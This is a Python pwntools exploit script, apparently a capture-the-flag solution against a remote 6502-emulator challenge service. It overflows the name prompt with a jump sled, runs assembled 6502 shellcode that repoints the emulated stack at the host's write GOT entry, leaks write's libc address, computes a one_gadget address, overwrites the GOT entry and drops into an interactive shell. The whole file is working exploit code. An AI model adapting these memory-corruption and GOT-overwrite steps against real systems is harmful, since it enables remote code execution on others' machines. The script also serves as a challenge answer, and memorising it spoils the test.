#!/usr/bin/env python
# coding=utf-8

from pwn import *
from pwn import logging

DEBUG = False
LOCAL = False

def asm_6502(data):
    print data
    asmcode = ""
    for line in data.split("\n"):
        line = line.strip()
        if len(line) == 0:
            continue
        print "ASMING: %s" % line.split("#")[0].replace(" ", "").replace("\n", "").strip()
        asmcode += line.split("#")[0].replace(" ", "").replace("\n", "").strip().decode("hex")
    print "ASM LENGTH: %d" % len(asmcode)
    return asmcode

def write_byte_at(byte, addr):
    out_str = ""
    out_str += "A9 %02X  # mov A, %#02X\n" % (byte, byte)
    out_str += "8D %s   # mov [%#04X], A\n" % (p16(addr).encode("hex"), addr)
    return out_str

def write_qword_at(qword, addr):
    out_str = ""
    for i in xrange(8):
        out_str += write_byte_at(qword % 0x100, addr + i)
        qword /= 0x100
    return out_str

def pop_byte_to_stdin():
    out_str = ""
    out_str += "68 # pop A\n"
    out_str += "8D CDAB # mov [0xABCD], A\n"
    return out_str

def push_byte_from_stdout():
    out_str = ""
    out_str += "AD CDAB # mov A, [0xABCD]\n"
    out_str += "48 # push A\n"
    return out_str

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def debug(p):
    if DEBUG:
        gdbscript = """
            p 0x6160D0
            p 0x6070b0
            b *0x15555470638c
            c
        """
        #   b *0x4055a8
        gdb.attach(p, gdbscript = gdbscript)

if LOCAL:
    p = process("./2010_chall", aslr = (not DEBUG))
else:
    p = remote("chall0.o40.rev.fish", 1337)

p.recvuntil("What is your name?\n")

debug(p)

pre_padding = "\x4C\x00\x02" # jmp 0x200
payload = pre_padding.rjust(0x50, '\xEA') + p16(0x1ab) + '\xEA' * 0x10

# &mem[0xf020] = &emulator
shell_code = ""
# write SP to write's GOT
shell_code += write_qword_at(2 ** 64 - 0x91 - 0x100, 0xf028)  # EDIT SP (Attention about 0x100 offset)
# get write_addr
shell_code += pop_byte_to_stdin() * 8
# edit write to one_gadget
shell_code += push_byte_from_stdout() * 8
shell_code += pop_byte_to_stdin()
if DEBUG:
    shell_code += "AD CDAB # DEBUG"

payload += asm_6502(shell_code)

p.sendline(payload)
p.recvuntil(", welcome to the game!\n")
write_addr = u64(p.recv(8))
print "WRITE_ADDR: %#x" % write_addr
libc_base = write_addr - 0x110140
print "WRITE_BASE: %#x" % libc_base
one_gadget = libc_base + 0x10a38c
print "ONE GADGET: %#x" % one_gadget
p.send(p64(one_gadget)[-1::-1])

p.interactive()

